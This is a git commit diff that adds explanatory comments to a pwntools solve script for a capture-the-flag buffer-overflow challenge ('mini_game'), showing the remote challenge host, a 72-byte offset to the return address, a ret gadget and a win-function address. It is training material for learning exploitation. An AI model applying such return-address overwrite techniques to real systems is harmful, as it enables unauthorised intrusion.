b196d719ab71c89930aaa324fe10883ba5e23540
gith-eng <135365698+gith-eng@users.noreply.github.com>
2026-04-19 19:11:06 +0200

    comments

--- BOF/04-mini-game/solve.py
+++ BOF/04-mini-game/solve.py
@@ -3,8 +3,12 @@ from pwn import *
 exe = ELF("./mini_game")
 p = remote("offsec.m0lecon.it", 13524)
 
+#offset to function pointer
+#python3 -c "from pwn import *; print(cyclic(200))
+#64B (buf) + 8B (saved RBP)
 OFFSET_TO_RIP = 72
 ret_gadget = 0x40101a
+#address of winning function
 win = 0x00000000004011fb
 
 p.recvuntil(b"go?")
